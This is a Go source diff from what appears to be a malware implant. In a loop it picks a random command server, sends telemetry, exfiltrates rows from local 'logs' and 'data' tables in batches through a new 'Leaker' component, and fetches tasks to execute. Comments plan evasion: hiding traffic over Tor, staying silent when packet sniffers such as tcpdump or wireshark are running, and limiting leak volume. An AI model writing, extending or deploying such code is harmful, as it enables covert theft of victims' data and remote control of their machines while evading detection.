@@ -10,17 +10,6 @@ import (
 	"time"
 )
 
-/*
-
-consider using tor for hidden communication.
-
-don't send too much data (its a little risky) - make leak limit
-don't leakDataAndGetTasks if there are sniffers (tcpdump, wireshark, etc..)
-don't leakDataAndGetTasks if there is too much cpu usage
-todo: search for more risky communication times
-
-*/
-
 func Routine(taskCh chan<- apps.AppData) {
 	conf, _ := config.GetConfig()
 	intervalSeconds, _ := strconv.Atoi(conf.Communication.Interval)
@@ -30,39 +19,34 @@ func Routine(taskCh chan<- apps.AppData) {
 	for {
 		<-ticker.C
 		serverConfig := getRandomServer()
-		if !CanCommunicate(serverConfig) {
+		if !CanCommunicate(serverConfig) || !isSafeToCommunicate() {
 			lgr.Error("Can't communicate with server", serverConfig.Address)
 		} else {
-			sendData("logs")
-			sendData("data")
+			telemetry, err := NewTelemetry(true)
+			if err != nil {
+				lgr.Error("Can't create telemetry", err.Error())
+			}
+			if _, _, err = SendTelemetry(serverConfig, telemetry); err != nil {
+				lgr.Error("Can't send telemetry", err.Error())
+			}
+
+			leaker := NewLeaker(
+				[]db.TableConfig{
+					{Name: "logs", BatchSize: 50},
+					{Name: "data", BatchSize: 1},
+				},
+				serverConfig,
+			)
+
+			if err := leaker.LeakData(); err != nil {
+				lgr.Error("Can't leak data", err.Error())
+			}
+
 			tasks := fetchTasks(serverConfig)
 			for _, task := range tasks {
 				taskCh <- task
 			}
 		}
-	}
-}
-
-func sendData(table string) {
-
-	for {
-		result, err := db.ReadOldestDataRow(table)
-		if err != nil {
-			return
-		}
-
-		jsonData, err := json.Marshal(result)
-		if err != nil {
-			return
-		}
-		_, _, _ = SendRequest(
-			POST,
-			CreateRoute(getRandomServer(), "receive"),
-			map[string]string{
-				"Content-Type": "application/json",
-			},
-			jsonData,
-		)
 	}
 }
 
@@ -101,4 +85,13 @@ func getRandomServer() config.ServerConfig {
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	index := rng.Intn(len(servers))
 	return servers[index]
+}
+
+func isSafeToCommunicate() bool {
+	/*
+		don't leakDataAndGetTasks if there are sniffers (tcpdump, wireshark, etc..)
+		don't leakDataAndGetTasks if there is too much cpu usage
+		todo: search for more risky communication times
+	*/
+	return true
 }
